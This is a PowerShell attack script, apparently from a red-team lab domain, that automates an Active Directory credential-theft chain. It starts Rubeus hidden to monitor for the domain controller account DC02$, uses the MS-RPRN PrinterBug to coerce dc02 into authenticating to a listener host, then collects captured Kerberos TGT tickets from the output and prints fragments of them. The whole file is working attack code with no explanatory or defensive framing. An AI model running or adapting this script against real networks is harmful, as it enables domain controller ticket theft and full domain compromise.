[CmdletBinding()]
param(
    [string]$TargetDC = "dc02.child.cadre.local",
    [string]$Listener = "mbr01.child.cadre.local"
)
$ErrorActionPreference = 'Continue'

$tools = 'C:\Windows\Temp\cadre-tools'
$rubeus = Join-Path $tools 'Rubeus.exe'
$msrprn = Join-Path $tools 'MS-RPRN.exe'
$outDir = 'C:\Windows\Temp\cadre-tools\T102-capture'
New-Item -ItemType Directory -Path $outDir -Force | Out-Null
$tgsFile = Join-Path $outDir 'dc02_tgs.txt'

Remove-Item $tgsFile -ErrorAction SilentlyContinue

# 1. Start Rubeus monitor for DC02$ as SYSTEM
$monitorArgs = "monitor /targetuser:DC02$ /interval:5 /nowrap"
$monProc = Start-Process -FilePath $rubeus -ArgumentList $monitorArgs -RedirectStandardOutput $tgsFile -RedirectStandardError "$tgsFile.err" -PassThru -WindowStyle Hidden
Write-Output "RUBEUS_PID $($monProc.Id)"
Start-Sleep -Seconds 4

# 2. Trigger PrinterBug (MS-RPRN) from mbr01 -> dc02 auth to mbr01
Write-Output "TRIGGER_MSRPRN $TargetDC -> $Listener"
$trig = & $msrprn "\\$TargetDC" "\\$Listener" 2>&1
$trig | ForEach-Object { Write-Output "MSRPRN_OUT|$_" }
Start-Sleep -Seconds 8

# 3. Stop monitor and collect
Stop-Process -Id $monProc.Id -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

if (Test-Path $tgsFile) {
    $content = Get-Content $tgsFile -Raw
    Write-Output "TGS_FILE_BYTES $($content.Length)"
    if ($content -match '(?i)KIRBI') {
        Write-Output "T102_OK: DC02$ TGT captured"
        # Extract kirbi markers
        [regex]::Matches($content, '(?i)<KRB_CRED>[\s\S]*?</KRB_CRED>') | ForEach-Object { Write-Output "KIRBI|$($_.Value.Substring(0, [Math]::Min(120, $_.Value.Length)))..." }
        Copy-Item $tgsFile "$outDir\dc02_captured.txt" -Force
    } else {
        Write-Output "T102_INFO: no KIRBI marker in output"
        Get-Content $tgsFile -Tail 5 | ForEach-Object { Write-Output "RUBEUS_TAIL|$_" }
    }
} else {
    Write-Output "T102_INFO: no TGS file produced"
}
